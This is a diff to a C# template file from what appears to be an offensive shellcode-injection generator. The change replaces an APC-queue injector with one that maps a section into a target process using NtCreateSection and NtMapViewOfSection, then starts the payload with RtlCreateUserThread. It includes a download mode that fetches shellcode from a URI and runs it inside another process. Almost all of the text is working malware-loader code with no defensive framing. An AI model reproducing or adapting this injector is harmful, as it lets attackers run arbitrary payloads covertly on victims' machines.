@@ -1,30 +1,28 @@
-﻿namespace SingleDose
+class NtCreateSection_NtMapViewOfSection
 {
-    class Suspend_QueueUserAPC
-    {
-        public static string STATICMODE = @"
-        Process proc = Process.GetProcessById( {{PROCESSID}} );
+    public static string STATICMODE = @"
+        Process target = Process.GetProcessById( {{PROCESSID}} );
         System.Collections.Generic.List<byte> payloadList = new System.Collections.Generic.List<byte>();
         {{SHELLCODE}}
         byte[] payload = payloadList.ToArray();
             ";
-        public static string DYNAMICMODE = @"
+    public static string DYNAMICMODE = @"
         if (args.Contains(""-h"", StringComparer.OrdinalIgnoreCase) || !args.Contains(""-pid"", StringComparer.OrdinalIgnoreCase) || !args.Contains(""-bin"", StringComparer.OrdinalIgnoreCase)) {
             Console.WriteLine(""-pid: Process ID of target process \n-bin: Path to shellcode"");
             Environment.Exit(0);
         }
         ArgValues parsedArgs = ArgParse(args);
-        Process proc = parsedArgs.Pid; 
+        Process target = parsedArgs.Pid; 
         byte[] payload = System.IO.File.ReadAllBytes(parsedArgs.binPath);
         ";
 
-        public static string DOWNLOADMODE = @"
+    public static string DOWNLOADMODE = @"
         if (args.Contains(""-h"", StringComparer.OrdinalIgnoreCase) || !args.Contains(""-pid"", StringComparer.OrdinalIgnoreCase) || !args.Contains(""-uri"", StringComparer.OrdinalIgnoreCase)) {
             Console.WriteLine(""-PID: Absolute filepath used to spawn process \n-URI: URI to download"");
             Environment.Exit(0);
         }
         ArgValues parsedArgs = ArgParse(args);
-        Process proc = parsedArgs.Pid;
+        Process target = parsedArgs.Pid;
         System.Net.WebClient wc = new System.Net.WebClient();
         byte[] payload;
         payload = wc.DownloadData(parsedArgs.DownloadURI);
@@ -34,8 +32,7 @@
             Console.WriteLine(""[!] Error downloading"");
         }
         ";
-
-        public static string DYNAMICARGPARSE = @"
+    public static string DYNAMICARGPARSE = @"
         public class ArgValues
         {
             public Process Pid;
@@ -83,8 +80,7 @@
 
             return collection;
         }";
-
-        public static string DOWNLOADARGPARSE = @"
+    public static string DOWNLOADARGPARSE = @"
         public class ArgValues
         {
             public Process Pid;
@@ -123,9 +119,8 @@
             }
             return collection;
         }";
-
-        public static string BODY = @"
-using System;
+    public static string BODY = @"using System;
+using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Linq;
@@ -133,45 +128,103 @@ using System.Runtime.InteropServices;
 
 namespace {{NAMESPACE}}
 {
-    public class Program
+    internal class Program
     {
-	    [Flags]
-	    public enum ThreadAccess : int
-	    {
-		    SUSPEND_RESUME = (0x0002),
-		    GET_CONTEXT = (0x0008),
-		    SET_CONTEXT = (0x0010)
-	    }
-	    public static void Main(string[] args)
-	    {
-		    {{TRIGGER}}
-		    {{MODE}}
-		    IntPtr lpResult = VirtualAllocEx(proc.Handle,IntPtr.Zero, (uint)payload.Length, 0x1000, 0x04); //MEM_COMMIT = 0x1000, RW= 0x04
-		    IntPtr bWritten;
-		    if (WriteProcessMemory(proc.Handle, lpResult, payload, (uint)payload.Length, out bWritten))
-            {
-			    uint oldPerms;
-			    VirtualProtectEx(proc.Handle, lpResult, payload.Length, 0x20, out oldPerms);
+        static void Main(string[] args)
+        {
+            {{TRIGGER}}
+            {{MODE}}
 
-			    ProcessThreadCollection thread = proc.Threads;
-			    for (int i = 0; i < 5; i++)
-				{
-					try
-					{
-						IntPtr hThread = OpenThread(ThreadAccess.SUSPEND_RESUME | ThreadAccess.GET_CONTEXT | ThreadAccess.SET_CONTEXT, false, thread[i].Id);
-						IntPtr ptr = QueueUserAPC(lpResult, hThread, IntPtr.Zero);
-					}
-                    catch
-                    {
-						continue;
-                    }
-				}
-		    }
-	    }
+            uint dwRet = 0;
+            uint dwMaxSize = (uint)payload.Length;
+            ulong ulGarbage = 0;
+            IntPtr hSection = IntPtr.Zero;
+            IntPtr hLocalSectionAddress = IntPtr.Zero;
+            IntPtr hRemoteSectionAddress = IntPtr.Zero;
+
+            dwRet = NtCreateSection( 
+                ref hSection,
+                SECTION_ALL_ACCESS,
+                IntPtr.Zero,
+                ref dwMaxSize,
+                0x40,/*RWX*/
+                SEC_COMMIT,
+                IntPtr.Zero);
+            
+            if (dwRet != 0)
+            {
+                Console.WriteLine(""[!] NtCreateSection failed. Exiting..."");
+                Environment.Exit(0);
+            }
+            
+            dwRet = NtMapViewOfSection(
+                hSection,
+                Process.GetCurrentProcess().Handle,
+                ref hLocalSectionAddress,
+                UIntPtr.Zero,
+                UIntPtr.Zero,
+                out ulGarbage,
+                out dwMaxSize,
+                2,
+                0,
+                0x40);/*RWX*/
+
+            if (dwRet != 0)
+            {
+                Console.WriteLine(""[!] NtMapViewOfSection for the local section failed. Exiting..."");
+                Environment.Exit(0);
+            }
+
+            dwRet = NtMapViewOfSection(
+                hSection,
+                target.Handle,
+                ref hRemoteSectionAddress,
+                UIntPtr.Zero,
+                UIntPtr.Zero,
+                out ulGarbage,
+                out dwMaxSize,
+                2,
+                0,
+                0x20);/*RX*/
+
+            if (dwRet != 0)
+            {
+                Console.WriteLine(""[!] NtMapViewOfSection for the remote section failed. Exiting..."");
+                Environment.Exit(0);
+            }
+
+            Marshal.Copy(payload, 0, hLocalSectionAddress, payload.Length);
+            
+            IntPtr hTargetThread = IntPtr.Zero;
+            RtlCreateUserThread(
+                target.Handle,
+                IntPtr.Zero,
+                false,
+                0,
+                IntPtr.Zero,
+                IntPtr.Zero,
+                hRemoteSectionAddress,
+                IntPtr.Zero,
+                ref hTargetThread,
+                IntPtr.Zero);
+
+            if (hTargetThread == IntPtr.Zero)
+            {
+                Console.WriteLine(""[!] RtlCreateUserThread failed. Exiting..."");
+                Environment.Exit(0);
+            }
+        }
         {{ARGS}}
+
+        private static uint SEC_COMMIT = 0x08000000;
+        private static uint SECTION_MAP_WRITE = 0x0002;
+        private static uint SECTION_MAP_READ = 0x0004;
+        private static uint SECTION_MAP_EXECUTE = 0x0008;
+        private static uint SECTION_ALL_ACCESS = SECTION_MAP_WRITE | SECTION_MAP_READ | SECTION_MAP_EXECUTE;
 
         {{PINVOKE}}
     }
-}";
-    }
 }
+";
+}
+
